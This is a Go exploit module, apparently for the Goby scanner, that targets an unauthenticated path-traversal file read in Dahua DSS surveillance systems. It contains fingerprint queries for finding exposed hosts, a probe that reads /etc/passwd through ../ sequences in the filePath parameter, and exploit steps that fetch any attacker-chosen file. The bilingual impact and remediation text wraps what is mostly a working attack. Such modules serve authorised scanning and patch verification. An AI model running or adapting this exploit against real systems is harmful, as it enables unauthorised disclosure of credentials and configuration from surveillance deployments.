package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS Digital Surveillance System /portal/attachment_downloadAtt.action File Read Vulnerability",
    "Description": "<p>Dahua DSS Digital Surveillance System is an efficient, stable, and comprehensive video surveillance solution widely used in enterprises and organizations. The attachment_downloadAtt.action interface of this system has file read vulnerability, allowing attackers to read sensitive internal file information without authentication, potentially leading to sensitive data leakage and severely threatening system security.</p>",
    "Product": "Dahua DSS Digital Surveillance System",
    "Homepage": "https://www.dahuatech.com/product/lists/169.html",
    "DisclosureDate": "2024-11-29",
    "PostTime": "2024-12-09",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"></span>\" || body=\"dahuaDefined/headCommon.js\" || (title==\"DSS\" && body=\"/portal\")",
    "GobyQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"></span>\" || body=\"dahuaDefined/headCommon.js\" || (title==\"DSS\" && body=\"/portal\")",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthenticated remote attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure, system configuration exposure, and facilitating further attacks.</p>",
    "Recommendation": "<p>It is recommended to immediately monitor the manufacturer's homepage and apply the latest security updates. Additionally, set access policies through security devices such as firewalls, restrict access permissions, and configure whitelist access. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144141501"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "textarea",
            "value": "../../../../../../etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "../../../../../../etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/attachment_downloadAtt.action?filePath={{{filePath}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "大华DSS数字监控系统 /portal/attachment_downloadAtt.action 文件读取漏洞",
            "Product": "大华DSS数字监控系统",
            "Description": "<p>大华DSS数字监控系统是一款高效、稳定且全面的视频监控解决方案，广泛应用于企业和组织。该系统的attachment_downloadAtt.action接口存在文件读取漏洞，攻击者无需身份验证即可利用此漏洞读取系统内部敏感文件信息，可能导致敏感数据泄露，严重威胁系统安全。</p>",
            "Recommendation": "<p>建议立即关注厂商主页并应用最新的安全更新。同时，通过防火墙等安全设备设置访问策略，限制访问权限，设置白名单访问。如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的远程攻击者读取系统中的文件，可能导致敏感信息泄露、系统配置暴露，进而为进一步的攻击提供便利。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Dahua DSS Digital Surveillance System /portal/attachment_downloadAtt.action File Read Vulnerability",
            "Product": "Dahua DSS Digital Surveillance System",
            "Description": "<p>Dahua DSS Digital Surveillance System is an efficient, stable, and comprehensive video surveillance solution widely used in enterprises and organizations. The attachment_downloadAtt.action interface of this system has file read vulnerability, allowing attackers to read sensitive internal file information without authentication, potentially leading to sensitive data leakage and severely threatening system security.</p>",
            "Recommendation": "<p>It is recommended to immediately monitor the manufacturer's homepage and apply the latest security updates. Additionally, set access policies through security devices such as firewalls, restrict access permissions, and configure whitelist access. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated remote attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure, system configuration exposure, and facilitating further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/portal/attachment_downloadAtt.action"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9977"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}